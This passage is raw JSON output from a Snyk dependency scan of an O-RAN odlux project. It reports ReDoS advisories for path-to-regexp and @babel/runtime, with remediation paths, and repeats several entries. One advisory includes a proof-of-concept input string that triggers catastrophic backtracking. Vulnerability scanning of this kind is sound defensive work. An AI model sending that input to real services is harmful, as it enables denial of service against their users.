              "modificationTime": "2024-09-10T13:33:00.998289Z"
            }
          ],
          "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when including multiple regular expression parameters in a single segment, which will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`, if two parameters within a single segment are separated by a character other than a `/` or `.`. Poor performance will block the event loop and can lead to a DoS.\r\n\r\n**Note:**\r\nWhile the 8.0.0 release has completely eliminated the vulnerable functionality, prior versions that have received the patch to mitigate backtracking may still be vulnerable if custom regular expressions are used. So it is strongly recommended for regular expression input to be controlled to avoid malicious performance degradation in those versions. This behavior is enforced as of version 7.1.0 via the `strict` option, which returns an error if a dangerous regular expression is detected.\r\n\r\n## Workaround\r\nThis vulnerability can be avoided by using a custom regular expression for parameters after the first in a segment, which excludes `-` and `/`.\n## PoC\n```js\r\n/a${'-a'.repeat(8_000)}/a\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `path-to-regexp` to version 0.1.10, 1.9.0, 3.3.0, 6.3.0, 8.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f)\n- [GitHub Commit](https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6)\n- [GitHub Commit](https://github.com/pillarjs/path-to-regexp/commit/f73ec6c86b06f544b977119c2b62a16de480a6a9)\n- [Strict Mode Release Note](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0)\n- [Vulnerability Write-up](https://blakeembrey.com/posts/2024-09-web-redos/)\n",
          "epssDetails": {
            "percentile": "0.38501",
            "probability": "0.00167",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2024-45296"
            ],
            "CWE": [
              "CWE-1333"
            ],
            "GHSA": [
              "GHSA-9wv6-86v2-598j"
            ]
          },
          "packageName": "path-to-regexp",
          "proprietary": false,
          "creationTime": "2024-09-10T06:12:52.186963Z",
          "functions_new": [],
          "alternativeIds": [],
          "disclosureTime": "2024-09-09T19:40:10Z",
          "exploitDetails": {
            "sources": [
              "Snyk"
            ],
            "maturityLevels": [
              {
                "type": "secondary",
                "level": "Proof of Concept",
                "format": "CVSSv3"
              },
              {
                "type": "primary",
                "level": "Proof of Concept",
                "format": "CVSSv4"
              }
            ]
          },
          "packageManager": "npm",
          "publicationTime": "2024-09-10T08:00:38.971163Z",
          "severityBasedOn": "CVSS",
          "modificationTime": "2025-06-16T06:59:36.219457Z",
          "socialTrendAlert": false,
          "packagePopularityRank": 99,
          "from": [
            "package.json@0.1.0",
            "react-router-dom@5.2.0",
            "react-router@5.2.0",
            "path-to-regexp@1.8.0"
          ],
          "upgradePath": [
            false,
            "react-router-dom@5.2.0",
            "react-router@5.2.0",
            "path-to-regexp@1.9.0"
          ],
          "isUpgradable": true,
          "isPatchable": false,
          "isPinnable": false,
          "isRuntime": false,
          "name": "path-to-regexp",
          "version": "1.8.0",
          "severityWithCritical": "medium"
        }
      ],
      "upgrade": {
        "@mui/material@5.13.2": {
          "upgradeTo": "@mui/material@5.16.2",
          "upgrades": [
            "@babel/runtime@7.22.0"
          ],
          "vulns": [
            "SNYK-JS-BABELRUNTIME-10044504"
          ]
        },
        "@mui/styles@5.13.2": {
          "upgradeTo": "@mui/styles@5.18.0",
          "upgrades": [
            "@babel/runtime@7.22.0"
          ],
          "vulns": [
            "SNYK-JS-BABELRUNTIME-10044504"
          ]
        },
        "jquery@3.3.1": {
          "upgradeTo": "jquery@3.5.0",
          "upgrades": [
            "jquery@3.3.1",
            "jquery@3.3.1",
            "jquery@3.3.1"
          ],
          "vulns": [
            "SNYK-JS-JQUERY-174006",
            "SNYK-JS-JQUERY-565129",
            "SNYK-JS-JQUERY-567880"
          ]
        },
        "jsonwebtoken@8.3.0": {
          "upgradeTo": "jsonwebtoken@9.0.0",
          "upgrades": [
            "jsonwebtoken@8.3.0",
            "jsonwebtoken@8.3.0",
            "jsonwebtoken@8.3.0"
          ],
          "vulns": [
            "SNYK-JS-JSONWEBTOKEN-3180022",
            "SNYK-JS-JSONWEBTOKEN-3180024",
            "SNYK-JS-JSONWEBTOKEN-3180026"
          ]
        }
      },
      "patch": {},
      "ignore": {},
      "pin": {}
    },
    "filesystemPolicy": false,
    "filtered": {
      "ignore": [],
      "patch": []
    },
    "uniqueCount": 8,
    "projectName": "package.json",
    "foundProjectCount": 20,
    "displayTargetFile": "features/sdnr/odlux/odlux/package.json",
    "hasUnknownVersions": false,
    "path": "/Users/mohammedimaduddin/Desktop/oran/oransc-sanity/imad/scripts/snyk-scan-workspace/oam_oam-controller"
  },
  {
    "vulnerabilities": [
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@emotion/react@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/react@11.11.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@emotion/styled@11.11.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/styled@11.11.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/icons-material@5.11.16",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/icons-material@5.11.16",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
